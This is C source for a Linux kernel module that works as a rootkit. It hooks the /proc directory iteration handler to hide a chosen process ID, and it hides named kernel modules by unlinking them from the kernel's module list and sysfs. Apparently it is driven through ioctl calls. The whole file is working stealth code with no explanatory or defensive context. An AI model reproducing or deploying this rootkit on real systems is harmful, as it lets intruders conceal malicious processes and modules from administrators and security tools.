#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/slab.h>

#include <linux/moduleparam.h>
#include <linux/init.h>
#include <linux/string.h>

#include <linux/fs.h> 
#include <linux/fs_struct.h> 
#include <linux/namei.h>

void init_ioctls(void);
void release_ioctls(void);

static struct list_head *modules;

static int (*proc_iterate_shared) (struct file *, struct dir_context *);
static filldir_t proc_fill;

static struct file_operations* hide_fops;
static struct file_operations* proc_fops;

static struct dir_context *proc_ctx;
static struct inode* proc_inode;
static int hide_pid=-1;

/*
 * function hooked readlink ops for /proc/<pid> inode
 */
static int hide_filldir_t(struct dir_context *dc, const char *name, int len,
		        loff_t off, u64 ino, unsigned int d_type)
{
	int curr_pid;

	kstrtoint(name, 10, &curr_pid);

 	if(curr_pid == hide_pid){
		 pr_err("%s: blocking printing of %d dir in /proc", __func__, curr_pid);
		return 0;
	}

	return proc_ctx->actor(proc_ctx, name, len, off, ino, d_type);
}

static struct dir_context hide_ctx = {
	.actor = hide_filldir_t,
};

/*
 * function hooked into original iterate_shared handler for /prco
 */
static int hide_iterate_shared(struct file* f, struct dir_context *dc)
{
	hide_ctx.pos = dc->pos;
	proc_ctx = dc;

	proc_iterate_shared(f, &hide_ctx);
	dc->pos = hide_ctx.pos;
	
	return 0;
}

/*
 * function hooking to given inode ops
 */
static int prepare_hooks(void)
{
	struct path proc_root;
	struct dentry* proc_dentry;
	hide_fops = kmalloc(sizeof(struct file_operations), GFP_KERNEL);

    	int ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_root);

	if(ret != 0 || !proc_root.dentry)
		goto error;
	
	proc_inode = proc_root.dentry->d_inode;
	
	proc_fops = proc_inode->i_fop;
	*hide_fops = *proc_inode->i_fop;

	proc_iterate_shared = proc_inode->i_fop->iterate_shared;
	hide_fops->iterate_shared = hide_iterate_shared;

	proc_inode->i_fop=hide_fops;
	
	return 0;

	error:
		pr_err("Couldn't retrieve dentries. Releasing hook..\n");
		return ret;
}

/*
 * module init function hooking to ioctl system call
 */
static int __init hide_init(void)
{
	pr_info("initializing debugfs entry and initializing ioctls..\n");
	modules = &THIS_MODULE->list;

	init_ioctls();
	prepare_hooks();

	return 0;
}

void hide_process(int pid){
	hide_pid = pid;
	pr_info("hidding process with pid: %d\n", hide_pid);
}

/*
 * function releasing readdir hook of /proc
 */
void hide_module(char* name)
{
	struct module* curr_mod;
	struct list_head* index;
	struct list_head* temp;

	pr_err("HIDING MODULE:\n");
	pr_err("hiding: %s\n",name);

	index=modules;

	do {
		curr_mod = container_of(index, struct module, list);

		if(curr_mod->name != NULL &&!strncmp(name, curr_mod->name, strlen(name))){
			
			 if(index == modules)
				modules = modules->next;
		
		       	 list_del(&curr_mod->list);
			 kobject_del(&curr_mod->mkobj.kobj);

			 curr_mod->sect_attrs = NULL;
			 curr_mod->notes_attrs = NULL;
			 break;
		}

		index = index->next;

	} while(index != modules);
	
}

static void release_hook(void)
{
	struct path proc_root;
	struct dentry* proc_dentry;
	hide_fops = kmalloc(sizeof(struct file_operations), GFP_KERNEL);

    	int ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_root);
	proc_inode = proc_root.dentry->d_inode;
	
	proc_inode->i_fop=proc_fops;	
}

/*
 * module exit function
 */
static void __exit hide_exit(void)
{

	pr_debug("Realeasing hidden processes..");
	release_ioctls();
	release_hook();
}


module_init(hide_init);
module_exit(hide_exit);

MODULE_AUTHOR("Mateusz Kalinowski");
MODULE_DESCRIPTION("kernel module hiding modules by name");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");
